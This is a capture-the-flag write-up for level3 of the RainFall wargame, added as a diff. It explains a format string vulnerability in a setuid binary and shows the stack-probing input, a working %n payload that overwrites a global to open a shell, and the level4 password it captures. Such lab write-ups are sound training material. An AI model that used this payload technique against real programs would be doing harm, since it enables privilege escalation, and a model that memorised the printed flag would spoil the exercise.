@@ -1,0 +1,40 @@
+level3@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
+
+Waits for an input, uses fgets, store it on a char[520] but only reads 512 char
+
+if (m == 0x40) --> if this condition is true, a system call is made (0x40 = 64)
+
+v() uses printf(local_20c) instead of printf("%s", local_20c) --> Format string vulnerability
+
+Objective: change m value using this vulnerability to access system("/bin/sh")
+
+To do this we'll use %n flag that write the number of char dsiplayed by printf
+in the variable given after the flag.
+
+We'll write 64 char + %n + m address
+
+In the format string vulnerability, the target address is injected at the beginning of the input
+printf will read this addr from the top of the stack and treat if as the pointer for %n
+
+We found our input is not at the top of the stack but it's the 4th argument, to check that:
+TEST_STRING="AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x" 
+echo -e $TEST_STRING | ./level3
+    output: AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e
+    [AAAA = 41414141]
+
+m address: readelf -s level3 | grep m
+    0804988c
+
+%4\$n : will call the 4th argument on the stack
+
+Payload: [m addr][64 - [m addr].length = 60 char = %60x][%4\$n]
+
+level3@RainFall:~$ echo -e "\x8c\x98\x04\x08%60x%4\$n" > /tmp/a
+level3@RainFall:~$ cat /tmp/a - | ./level3 
+�                                                         200
+Wait what?!
+cd ../level4	
+cat .pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
